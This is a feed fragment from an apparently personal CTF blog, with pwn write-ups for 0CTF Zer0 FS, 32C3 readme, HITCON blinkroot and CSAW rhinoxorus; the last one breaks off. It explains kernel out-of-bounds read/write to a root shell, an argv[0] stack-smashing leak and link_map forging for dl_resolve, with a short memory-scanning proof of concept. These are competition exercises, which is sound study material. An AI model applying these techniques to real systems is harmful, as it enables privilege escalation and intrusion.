+&lt;p&gt;此時就很悲劇的發現 remote server 壞掉&lt;br&gt;
+就此跟 AK 無緣 QQ  &lt;/p&gt;
+&lt;p&gt;不過後來修好之後, 還發現有一點小問題&lt;br&gt;
+remote 因為 terminal 不同的關係, 觸發 &lt;code&gt;restore&lt;/code&gt; 時 input buffer 是髒的&lt;br&gt;
+不能直接輸入檔名, 要先送一些 &lt;code&gt;/b&lt;/code&gt; 清掉 buffer 之後&lt;br&gt;
+再送 &lt;code&gt;flag&lt;/code&gt; (or &lt;code&gt;flag.glksave&lt;/code&gt;) 才會是正確的檔名  &lt;/p&gt;
+&lt;h2&gt;Note&lt;/h2&gt;
+&lt;p&gt;其實發現 pickle 不能喝有一段時間&lt;br&gt;
+但我竟然沒有馬上意識到漏洞有相關...Orz&lt;br&gt;
+也沒有馬上提出來討論&lt;br&gt;
+不然可能可以省下 2 hr 的找漏洞時間來寫 exploit&lt;br&gt;
+絕對是戰犯無誤 QQ&lt;br&gt;
+還好沒有錯失 DEFCON 的資格...  &lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;PCTF{pWn_4dv3ntUrE_IF_3d1ti0n}&lt;/code&gt;&lt;br&gt;
+exploit: &lt;a href="https://ddaa.tw/exp/plaid-adventure-ii.py"&gt;plaid-adventure-ii.py&lt;/a&gt;  &lt;/p&gt;</content><category term="PlaidCTF"></category><category term="Out-of-bound"></category></entry><entry><title>0CTF 2018 Pwnable 478 Zer0 FS</title><link href="https://ddaa.tw/0ctf_pwnable_478_zer0fs.html" rel="alternate"></link><published>2018-04-06T22:51:00+08:00</published><updated>2018-04-06T22:51:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2018-04-06:/0ctf_pwnable_478_zer0fs.html</id><summary type="html">&lt;p&gt;The problem was solved with &lt;strong&gt;jeffxx&lt;/strong&gt;, &lt;strong&gt;atdog&lt;/strong&gt; and &lt;strong&gt;lays&lt;/strong&gt;&lt;br&gt;
+Most of exploit was written by &lt;strong&gt;atdog&lt;/strong&gt; during the competition and I rewrote the exploit for the write-up.  &lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;Analysis&lt;/h2&gt;
+&lt;p&gt;We will enter a shell that building by KVM after ssh connection enbalished. The discription said the flag is &lt;code&gt;sha256(/root/flag …&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;The problem was solved with &lt;strong&gt;jeffxx&lt;/strong&gt;, &lt;strong&gt;atdog&lt;/strong&gt; and &lt;strong&gt;lays&lt;/strong&gt;&lt;br&gt;
+Most of exploit was written by &lt;strong&gt;atdog&lt;/strong&gt; during the competition and I rewrote the exploit for the write-up.  &lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;Analysis&lt;/h2&gt;
+&lt;p&gt;We will enter a shell that building by KVM after ssh connection enbalished. The discription said the flag is &lt;code&gt;sha256(/root/flag)&lt;/code&gt;, but we had no permisson to read it. As other Linux kernel challenge, our target is obtaining the root priviledge, then we can calculate the hash of &lt;code&gt;/root/flag&lt;/code&gt;.&lt;br&gt;
+There are two setuid programs under the root directory. One of them is &lt;code&gt;/mount&lt;/code&gt;. Try to execute &lt;code&gt;/mount&lt;/code&gt; but the error message is as below:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;mount: mounting /tmp/zerofs.img on /mnt failed: No such file or directory&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;After created &lt;code&gt;/tmp/zerofs.img&lt;/code&gt;, we got another error message:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;mount: mounting /dev/loop0 on /mnt failed: Device or resource busy&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Well, maybe we should make a normal image at first. Aside from creating image, let's see what files the challenge gave.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-rw-r--r-- yoghur7/yoghur7 7173904 2018-03-29 03:42 public/bzImage
+-rw-rw-r-- yoghur7/yoghur7 3229184 2018-03-30 01:13 public/rootfs.cpio
+-rw-r--r-- yoghur7/yoghur7  326664 2018-03-29 03:42 public/zerofs.ko
+-rwxrwxr-x yoghur7/yoghur7     240 2018-03-29 03:42 public/run.sh
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;run.sh&lt;/code&gt; is a shellscript to start the challege environment by kvm (or qemu). Notice, the arguments include &lt;code&gt;-initrd&lt;/code&gt;. It means the rootfs is made by ramdisk and files will be stored in memory. I used the feature for exploit this challenge.  &lt;/p&gt;
+&lt;p&gt;Obviously, we should analysis &lt;code&gt;zerofs.ko&lt;/code&gt; at first. &lt;strong&gt;jeffxx&lt;/strong&gt; found a repository called &lt;a href="https://github.com/psankar/simplefs"&gt;simplefs&lt;/a&gt; which is very similar with zerofs.ko, but a little difference still exists, such as the inode structure and super block. We made a little &lt;a href="https://ddaa.tw/exp/0001-make-zerofs-image.patch"&gt;modification&lt;/a&gt; after reversing &lt;code&gt;zerofs.ko&lt;/code&gt; and we could make a legal image thourgh &lt;code&gt;mkfs-simplefs&lt;/code&gt;. By the way, I didn't attend the reverse stage ... I was stucking in &lt;strong&gt;Might dragon&lt;/strong&gt; at that time. Orz  &lt;/p&gt;
+&lt;h2&gt;Vulnerability&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;zerofs_write&lt;/code&gt;: There was a buffer overflow when using &lt;code&gt;copy_from_user&lt;/code&gt; but it didn't check the boundary. This vulnerabiliy wouldn't be use in my exploit.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;zerofs_read&lt;/code&gt;: It checked that the length must be smaller than file size. However, because we could control the full file system, we could make an illegal file which file size is not equal to the real size (see &lt;a href="https://ddaa.tw/exp/0002-illegal-size.patch"&gt;patch2&lt;/a&gt;). After that, it will leak extra data in kernel memory when reading the file.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;zerofs_lleek&lt;/code&gt;: Exist the same problem that mention in &lt;code&gt;zerofs_read&lt;/code&gt;. We could call &lt;code&gt;lseek&lt;/code&gt; to control the position of the file.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;We could combine &lt;code&gt;llseek&lt;/code&gt; with &lt;code&gt;zerofs_read&lt;/code&gt; to leak the data more easier or &lt;code&gt;zerofs_write&lt;/code&gt; to avoid breaking some important sturcture.  &lt;/p&gt;
+&lt;h2&gt;Exploit&lt;/h2&gt;
+&lt;p&gt;Our target is getting the root priviledge and reading &lt;code&gt;/root/flag&lt;/code&gt;. As above mentioned, the rootfs was on kernel memory, so we could modify the file throught arbitrary write in &lt;code&gt;zerofs_write&lt;/code&gt;. I also noticed that both &lt;code&gt;/mount&lt;/code&gt; and &lt;code&gt;/umount&lt;/code&gt; are setuid programs. We could replace a part of file content to our shellcode. I think it is the easiest way to reach our target.  &lt;/p&gt;
+&lt;p&gt;Now, we almost had an arbitrary read or write on kernel memory, but we could not confirm the offset because the randomization of kernel heap mechanism. Thus, we must to identify the distance between the overflowed buffer and the rootfs.  &lt;/p&gt;
+&lt;p&gt;I disabled KASLR and use gdb to watch the kernel memory. It looks like below:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pwndbg&amp;gt; vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+    0x7ffe4e844000     0x7ffe4e847000 rwxp     3000 0          &amp;lt;=== user space program
+0xffff880002dbd000 0xffff8800035bd000 rwxp   800000 0          &amp;lt;=== overflowed buffer
+0xffff880003614000 0xffff880003e14000 rwxp   800000 0          &amp;lt;=== rootfs
+0xffffc900001c2000 0xffffffff82203000 rwxp 36ff82041000 0      [stack]
+0xffffffff8143a000 0xffffffff81c3a000 rwxp   800000 0
+0xffffffffbffff000 0xffffffffc0004000 rwxp     5000 0
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;I noticed that the offset of rootfs is fixed, but the offset of overflowed buffer would change. I'm not sure the reason, maybe it was generated dynamicly by &lt;code&gt;__bread_gfp&lt;/code&gt;? Despite sometime it would be the same, I wanted to make a stable exploit because it was annoying to upload file to the remote environment.  &lt;/p&gt;
+&lt;p&gt;We could write a program that keeps adjust the position by &lt;code&gt;lseek&lt;/code&gt; and leaking memory by &lt;code&gt;read&lt;/code&gt;, then checking if the leaked data contains the specified pattern. I chose a string &lt;strong&gt;/bin/mount&lt;/strong&gt; to be the pattern because it occurs in rootfs once and it is used by &lt;code&gt;/mount&lt;/code&gt;. After finding the pattern, we could add or minus the offset to modify any file on rootfs. The proof-of-concept is as below:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;for (int i = start; i &amp;lt; end; i++) {
+    lseek(fd, i * 0x1000, SEEK_SET);
+    read(fd, buf, 0x1000);
+    if (search(buf, PATTERN)) {
+        printf(&amp;quot;offset = %d\n&amp;quot;, i);
+        off = i * 0x1000  - 0x94000 + 0x1081;
+        break;
+    }
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Finally, adjust the file position to the calculated offsetand and write a shellcode to execute &lt;code&gt;/bin/sh&lt;/code&gt;. After that, execute &lt;code&gt;/mount&lt;/code&gt; again. We could get a shell with the root priviledge. :)&lt;/p&gt;
+&lt;h2&gt;Note&lt;/h2&gt;
+&lt;p&gt;There are some detail about making the exploit.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;For local testing, I wrote a script to repack rootfs into a cpio file. The image and exploit will in the file system after rebooting.&lt;/li&gt;
+&lt;li&gt;Adding &lt;code&gt;-s&lt;/code&gt; into the arguments when starting qemu and using gdb remote attach to debug my exploit.&lt;/li&gt;
+&lt;li&gt;Modify &lt;code&gt;/init&lt;/code&gt; to initialize something, such as mount /tmp/zerofs.img and set priviledge to root.&lt;/li&gt;
+&lt;li&gt;The environment linked most of binary to busybox. Thus, I uploaded the image and exploit by copy-paste base64 string and decode them back to the binary. Is there a better way?&lt;/li&gt;
+&lt;li&gt;I needed to keep the size of exploit small because using copy-paste to upload, but there is no glibc in the environment. Thus, I compiled my exploit with &lt;a href="https://www.fefe.de/dietlibc/"&gt;dietlibc&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;As our expectation, we could not find the pattern like &lt;code&gt;flag{&lt;/code&gt; directly, because &lt;code&gt;/root/flag&lt;/code&gt; is a pure binary file.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;flag: &lt;code&gt;flag{600291f9a05a1e78215aa48c9ff6a4b1bb207c2b4ffa66223fcc67c04281397f}&lt;/code&gt;  &lt;/p&gt;
+&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/zerofs.c"&gt;exp.c&lt;/a&gt;  &lt;/p&gt;</content><category term="0CTF"></category><category term="Linux kernel"></category></entry><entry><title>32C3CTF 2015 PWN 200 readme</title><link href="https://ddaa.tw/32c3ctf_2015_pwn_200_readme.html" rel="alternate"></link><published>2015-12-31T18:21:00+08:00</published><updated>2015-12-31T18:21:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-12-31:/32c3ctf_2015_pwn_200_readme.html</id><summary type="html">&lt;p&gt;這題被安博給攔胡了 T_T&lt;br&gt;
+沒發現 rodata 有 flag 可以 leak XD  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題一開始打開來看沒什麼頭緒&lt;br&gt;
+然後一堆隊伍都秒解出來 = =&lt;br&gt;
+嘗試塞很長的 payload 結果發生奇怪的 crash&lt;br&gt;
+&lt;code&gt;__GI_getenv (name=0x7ffff7b9c26b "BC_FATAL_STDERR_",...&lt;/code&gt;&lt;br&gt;
+於是把 &lt;code&gt;LIBC_FATAL_STDERR&lt;/code&gt; 當成關鍵字丟進 google&lt;br&gt;
+找到一篇韓國 conference &lt;em&gt;inc0gnito&lt;/em&gt; 的 &lt;a href="http://inc0gnito.com/Inc0gnito/ssp.pdf"&gt;pdf&lt;/a&gt;&lt;br&gt;
+裡面有提到觸發 stack guard 以後&lt;br&gt;
+可以透過覆蓋環境變數 leak memory  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# sysdeps/unix/sysv/linux/libc_fatal.c
+/* Open a descriptor for /dev/ttyunless the user explicitly …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;這題被安博給攔胡了 T_T&lt;br&gt;
+沒發現 rodata 有 flag 可以 leak XD  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題一開始打開來看沒什麼頭緒&lt;br&gt;
+然後一堆隊伍都秒解出來 = =&lt;br&gt;
+嘗試塞很長的 payload 結果發生奇怪的 crash&lt;br&gt;
+&lt;code&gt;__GI_getenv (name=0x7ffff7b9c26b "BC_FATAL_STDERR_",...&lt;/code&gt;&lt;br&gt;
+於是把 &lt;code&gt;LIBC_FATAL_STDERR&lt;/code&gt; 當成關鍵字丟進 google&lt;br&gt;
+找到一篇韓國 conference &lt;em&gt;inc0gnito&lt;/em&gt; 的 &lt;a href="http://inc0gnito.com/Inc0gnito/ssp.pdf"&gt;pdf&lt;/a&gt;&lt;br&gt;
+裡面有提到觸發 stack guard 以後&lt;br&gt;
+可以透過覆蓋環境變數 leak memory  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# sysdeps/unix/sysv/linux/libc_fatal.c
+/* Open a descriptor for /dev/ttyunless the user explicitly
+     requests errors on standard error.  */
+  constchar *on_2 = __secure_getenv(&amp;quot;LIBC_FATAL_STDERR_&amp;quot;);
+  if (on_2 == NULL || *on_2 == &amp;#39;\0&amp;#39;)
+    fd= open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);
+  if (fd == -1)
+    fd= STDERR_FILENO;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;只要把 &lt;code&gt;LIBC_FATAL_STDERR&lt;/code&gt; 隨便設一個值&lt;br&gt;
+程式就會被 stderr 的訊息給噴回來了&lt;br&gt;
+開啟 stack guard 後如果發生 bof 會噴出像這樣的錯誤訊息：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;*** stack smashing detected ***: ./readme.bin terminated&lt;br&gt;
+Aborted (core dumped)  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;pdf 提到透過覆蓋 &lt;code&gt;__libc_argv[0]&lt;/code&gt;&lt;br&gt;
+把內容改成我們想要 leak 的 address&lt;br&gt;
+就可以達成 infomation leak  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# debug/fortify_fail.c
+__libc_message(2, &amp;quot;*** %s ***: %s terminated\n&amp;quot;,msg, __libc_argv[0] ?: &amp;quot;&amp;lt;unknown&amp;gt;&amp;quot;);
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;這題很好心也很壞心的讓我們可以在 &lt;code&gt;0x600d20&lt;/code&gt; 寫值&lt;br&gt;
+但是那邊也是 flag 的位置...囧&lt;br&gt;
+我們可以把內容設成 &lt;code&gt;LIBC_FATAL_STDERR=xxx&lt;/code&gt;&lt;br&gt;
+在 overflow 的時候在 552 offset 的位置蓋上 &lt;code&gt;0x600d20&lt;/code&gt;&lt;br&gt;
+就可以控制 &lt;code&gt;LIBC_FATAL_STDERR&lt;/code&gt; 的值了&lt;br&gt;
+這樣就可以把 stderr 噴回來&lt;br&gt;
+剩下的問題就是 leak 什麼內容&lt;br&gt;
+這題雖然看似在 &lt;code&gt;0x600d20&lt;/code&gt; 會把 flag 內容覆蓋掉&lt;br&gt;
+但是在 elf 初始化時會把字串留在 &lt;code&gt;0x400d20&lt;/code&gt; rodata 段上面&lt;br&gt;
+因此這題把 &lt;code&gt;0x400d20&lt;/code&gt; 的內容 leak 出來&lt;br&gt;
+就可以獲得 flag 了  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Hello!&lt;br&gt;
+What's your name? Nice to meet you, .&lt;br&gt;
+Please overwrite the flag: Thank you, bye!&lt;br&gt;
+&lt;code&gt;*** stack smashing detected ***: 32C3_ELF_caN_b3_pre7ty_we!rd... terminated&lt;/code&gt;  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/readme.py"&gt;meh.py&lt;/a&gt;  &lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;32C3_ELF_caN_b3_pre7ty_we!rd&lt;/code&gt;  &lt;/p&gt;</content><category term="3XC3CTF"></category><category term="Stack Overflow"></category><category term="Trick"></category></entry><entry><title>HITCON 2015 PWN 200 blinkroot</title><link href="https://ddaa.tw/hitcon_pwn_200_blinkroot.html" rel="alternate"></link><published>2015-10-20T01:23:00+08:00</published><updated>2015-10-20T01:23:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-10-20:/hitcon_pwn_200_blinkroot.html</id><summary type="html">&lt;p&gt;這次也是一題都沒解出來&lt;br&gt;
+大概是沒天份吧&lt;br&gt;
+不過其實後來知道怎麼偽造 link_map 以後&lt;br&gt;
+比賽期間寫的 payload 一度已經很接近了...&lt;br&gt;
+只是後來方向錯了 Orz...   &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題的程式非常簡單&lt;br&gt;
+pseudo code 長這樣:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;char data[1024];
+int main()
+{
+    if (recvlen(0, data, 1024) == 1024) {
+        close(0);
+        close(1);
+        close(1);
+        data[(int)data] = (int128)(0x1000000000 | data[8]);
+        puts(data[16]);
+    }
+    exit(0);
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;前八個 byte 可以任意控制&lt;br&gt;
+所以會造成任意寫值的問題
+這題不知道用什麼方式&lt;br&gt;
+組合語言是透過 xmm0 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這次也是一題都沒解出來&lt;br&gt;
+大概是沒天份吧&lt;br&gt;
+不過其實後來知道怎麼偽造 link_map 以後&lt;br&gt;
+比賽期間寫的 payload 一度已經很接近了...&lt;br&gt;
+只是後來方向錯了 Orz...   &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題的程式非常簡單&lt;br&gt;
+pseudo code 長這樣:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;char data[1024];
+int main()
+{
+    if (recvlen(0, data, 1024) == 1024) {
+        close(0);
+        close(1);
+        close(1);
+        data[(int)data] = (int128)(0x1000000000 | data[8]);
+        puts(data[16]);
+    }
+    exit(0);
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;前八個 byte 可以任意控制&lt;br&gt;
+所以會造成任意寫值的問題
+這題不知道用什麼方式&lt;br&gt;
+組合語言是透過 xmm0 寫值&lt;br&gt;
+能寫的位置一定要對齊 16 byte (addr &amp;amp; 0xf == 0)&lt;br&gt;
+而且前 8 byte 還固定成 0x10&lt;br&gt;
+所以不能單純靠改 &lt;code&gt;.dynamic&lt;/code&gt; 來解這題&lt;br&gt;
+那這題的作法是偽造 &lt;em&gt;link_map&lt;/em&gt; 以後做 &lt;em&gt;dl_resolve&lt;/em&gt;&lt;br&gt;
+目標讓呼叫 &lt;code&gt;puts(data[16])&lt;/code&gt; 變成解出 &lt;code&gt;system[data[16]]&lt;/code&gt;  &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;dl_resolve&lt;/em&gt; 是 ELF 有做 lazy binding 的時候&lt;br&gt;
+function call 不會直接跳進 libc&lt;br&gt;
+而是透過 got.plt 得到 function 的 index 後&lt;br&gt;
+跳到 PLT0 才解析出 function 在 libc 中的位置&lt;br&gt;
+簡單來說大概就是做這樣的事情&lt;br&gt;
+&lt;code&gt;dl_runtime_resolve (link_map,index)&lt;/code&gt;&lt;br&gt;
+&lt;em&gt;dl_resolve&lt;/em&gt; 裡面還會 call &lt;code&gt;_dl_fixup&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;_dl_fixup&lt;/code&gt; 才是真正去查 libc address 的地方  &lt;/p&gt;
+&lt;p&gt;以前考過的 &lt;em&gt;dl_resolve&lt;/em&gt; 的做法&lt;br&gt;
+是透過偽造 index&lt;br&gt;
+讓 &lt;code&gt;__fix_up&lt;/code&gt; 去解 symbol 時落在我們偽造的 &lt;em&gt;SYMTAB&lt;/em&gt; 上面&lt;br&gt;
+再讓查 &lt;code&gt;st_name&lt;/code&gt; 時落在我們想要執行的 function 名稱&lt;br&gt;
+這題的沒辦法去控制 index&lt;br&gt;
+所以變成只能從偽造 &lt;em&gt;link_map&lt;/em&gt; 下手  &lt;/p&gt;
+&lt;p&gt;根據我比賽時的整整 12 個小時的嘗試...&lt;br&gt;
+完整的偽造 &lt;em&gt;link_map&lt;/em&gt; 是不可能做到的 T__T&lt;br&gt;
+原因是 &lt;em&gt;link_map&lt;/em&gt; 中有一個 &lt;code&gt;l_scope&lt;/code&gt; 的 member&lt;br&gt;
+在 &lt;code&gt;_dl_fixup&lt;/code&gt; 內部的 &lt;code&gt;_dl_lookup_symbol_x&lt;/code&gt; 會用上&lt;br&gt;
+&lt;code&gt;l_scope&lt;/code&gt; 會指向 &lt;em&gt;link_map&lt;/em&gt; 本身&lt;br&gt;
+&lt;em&gt;link_map&lt;/em&gt; 的結構是一個 linked_list&lt;br&gt;
+每個 node 保存 elf 和有使用到的 shared library symbol&lt;br&gt;
+&lt;code&gt;_dl_lookup_symbol_x&lt;/code&gt; 比對所有 shared library 的 symbol&lt;br&gt;
+試著找出目前 function call 的這個 symbol&lt;br&gt;
+我們無法得知 glibc 的 &lt;em&gt;link_map&lt;/em&gt; ... 所以不可能偽造成功 QQ  &lt;/p&gt;
+&lt;p&gt;那 &lt;em&gt;dl_resolve&lt;/em&gt; 還有一個利用方式是:&lt;br&gt;
+如果 function 已經被解析過&lt;br&gt;
+&lt;a href="https://github.com/lattera/glibc/blob/master/elf/dl-runtime.c#L90"&gt;dl-runtime.c:90&lt;/a&gt;  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&amp;gt;st_other), 0) == 0) { ... }&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;else { ... }&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;會直接進入 else, 不會進入 &lt;code&gt;_dl_lookup_symbols_x&lt;/code&gt;&lt;br&gt;
+直接透過 &lt;code&gt;link_map-&amp;gt;l_addr + sym-&amp;gt;st_value&lt;/code&gt; 得到結果&lt;br&gt;
+這兩個值都可以透過偽造 &lt;em&gt;link_map&lt;/em&gt; 來控制&lt;br&gt;
+如果在已知 libc 版本的情況下&lt;br&gt;
+我們可以讓 &lt;code&gt;l_addr&lt;/code&gt; 或 &lt;code&gt;st_value&lt;/code&gt; 其中一個是以解析過的 function&lt;br&gt;
+另一個則透過 libc 算出適當的 offset&lt;br&gt;
+就可以跳到任意函式了&lt;br&gt;
+還有一個要注意的是&lt;br&gt;
+原本 &lt;em&gt;dl_resolve&lt;/em&gt; 解析完會將結果寫回 GOT 上&lt;br&gt;
+但是 offset 亂掉了結果可能會是一個不能寫的區段&lt;br&gt;
+所以還要偽造 &lt;em&gt;JMPREL&lt;/em&gt; 結果能寫回去才行&lt;br&gt;
+至於要寫到哪裡就隨意了 反正之後不會用上  &lt;/p&gt;
+&lt;p&gt;這題我先嘗試讓 &lt;em&gt;link_map&lt;/em&gt; 落在 &lt;code&gt;__libc_start_main&lt;/code&gt; 的 GOT&lt;br&gt;
+這樣 &lt;code&gt;l_addr&lt;/code&gt; 就會是 &lt;code&gt;__libc_start_main&lt;/code&gt; 的 address&lt;br&gt;
+再偽造 &lt;code&gt;STMTAB&lt;/code&gt; 和 &lt;em&gt;JMPREL&lt;/em&gt; 得到 &lt;code&gt;st_value&lt;/code&gt; 並算出 system 的位置&lt;br&gt;
+結果是成功的...但是這題有個問題是&lt;br&gt;
+如果這樣子偽造, &lt;em&gt;link_map&lt;/em&gt; 會在 &lt;code&gt;data - 0x48&lt;/code&gt; 的位置&lt;br&gt;
+但是 &lt;em&gt;SYMTAB&lt;/em&gt; 的位置在 &lt;code&gt;link_map + 0x68 == data + 0x20&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;puts&lt;/code&gt; 的參數卻是 &lt;code&gt;data[0x10]&lt;/code&gt;...&lt;br&gt;
+所以能執行的指令就變成不能超過 16 byte XD&lt;br&gt;
+對於一般的題目倒也沒差&lt;br&gt;
+但是這題把 fd 都關了所以只能把執行結果送回來而已&lt;br&gt;
+16 byte 根本不夠用 Orz  &lt;/p&gt;
+&lt;p&gt;第二次的做法就變成讓 &lt;em&gt;link_map&lt;/em&gt; 完整的落在 data[512] 上&lt;br&gt;
+&lt;code&gt;l_addr&lt;/code&gt; 可以隨意控制&lt;br&gt;
+再將 &lt;em&gt;SYMTAB&lt;/em&gt; 偽造到 GOT 上&lt;br&gt;
+滿足 &lt;code&gt;st_other != 0&lt;/code&gt; 且 &lt;code&gt;st_value == libc address&lt;/code&gt;&lt;br&gt;
+一樣要偽造 &lt;em&gt;JMPREL&lt;/em&gt; 讓結果可以寫回去&lt;br&gt;
+就可以解出任意的 libc function 了&lt;br&gt;
+後來想想第二種的做法似乎限制比較少&lt;br&gt;
+更好利用  &lt;/p&gt;
+&lt;p&gt;總結一下透過 &lt;code&gt;st_other&lt;/code&gt; 的利用條件:  &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;已經有 glibc 可以算 offset&lt;/li&gt;
+&lt;li&gt;有大約 0x140 以上的 buffer 可以偽造 &lt;em&gt;link_map&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;取決於 function index, 越後面所需空間越大&lt;/li&gt;
+&lt;li&gt;可以 return 到 plt 上, 或是可以改 got 上的 &lt;em&gt;link_map&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;要已知可寫的 address ... 所以開 PIE 這招大概還是不能用 Orz&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;flag: &lt;code&gt;hitcon{81inkr0Qt I$ #B|InK1n9#}&lt;/code&gt;&lt;/p&gt;</content><category term="HITCON CTF"></category><category term="dl_resolve"></category></entry><entry><title>CSAW CTF 2015 pwn 500 rhinoxorus</title><link href="https://ddaa.tw/csawctf_pwn_500_rhinoxorus.html" rel="alternate"></link><published>2015-09-21T21:23:00+08:00</published><updated>2015-09-21T21:23:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-09-21:/csawctf_pwn_500_rhinoxorus.html</id><summary type="html">&lt;p&gt;想說這次 CSAW 從比較難的題目開始解&lt;br&gt;
+結果 ida 打開一分鐘就看到洞了 囧&lt;br&gt;
+不過 exploit 還是寫個 3 小時左右吧&lt;br&gt;
+挺煩人的...&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題的程式行為就是不斷的做 function call&lt;br&gt;
+有 256 個不同的 function&lt;br&gt;
+buf 大小不太一樣, 行為卻都類似&lt;br&gt;
+毫無意義可言....
+程式碼大概長這樣:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;void func_2a(char *a1, int a2)
+{
+    char buf[100];
+    int len = a2 - 1;
+    ...
+    if (len) {
+        for (i = 0; i &amp;lt; len; i++)
+            buf ^= a1[i];
+        func_array …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;想說這次 CSAW 從比較難的題目開始解&lt;br&gt;
+結果 ida 打開一分鐘就看到洞了 囧&lt;br&gt;
+不過 exploit 還是寫個 3 小時左右吧&lt;br&gt;
+挺煩人的...&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題的程式行為就是不斷的做 function call&lt;br&gt;
+有 256 個不同的 function&lt;br&gt;
+buf 大小不太一樣, 行為卻都類似&lt;br&gt;
+毫無意義可言....
+程式碼大概長這樣:  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;void func_2a(char *a1, int a2)
+{
+    char buf[100];
+    int len = a2 - 1;
+    ...
+    if (len) {
+        for (i = 0; i &amp;lt; len; i++)
+            buf ^= a1[i];
+        func_array[buf[0]](&amp;amp;buf[1], len);
+    }
+}
+
+void process_connection(int fd)
+{
+    char buf[256];
+    int len;
+
+    memset(buf, 0, 256);
+    len = recv(fd, buf, 256, 0));
+    if (len &amp;gt; 0)
+        func_array[buf[0]](buf, len);
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;這邊先定義一次 stack frame 的層數&lt;br&gt;
+後面會比較好說明  &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;layer0: &lt;code&gt;process_connetion&lt;/code&gt; 的 stack frame  &lt;/li&gt;
+&lt;li&gt;layer1: 第一次的 function call  &lt;/li&gt;
+&lt;li&gt;layer2: 第二次的 function call, 後以此類推  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;很明顯的 overflow&lt;br&gt;
+下一層的 buffer 一定比 &lt;code&gt;layer0&lt;/code&gt; 的 256 小&lt;br&gt;
+做 xor 時就會蓋到超出 stack frame 的範圍&lt;br&gt;
+而且還不是直接 copy 過去&lt;br&gt;
+是做 xor 寫值 ... 所以什麼 stack guard 根本可以無視 XDD  &lt;/p&gt;
+&lt;p&gt;那思路其實就滿明確的&lt;br&gt;
+&lt;strong&gt;先 bof, 然後做 rop&lt;/strong&gt;&lt;br&gt;
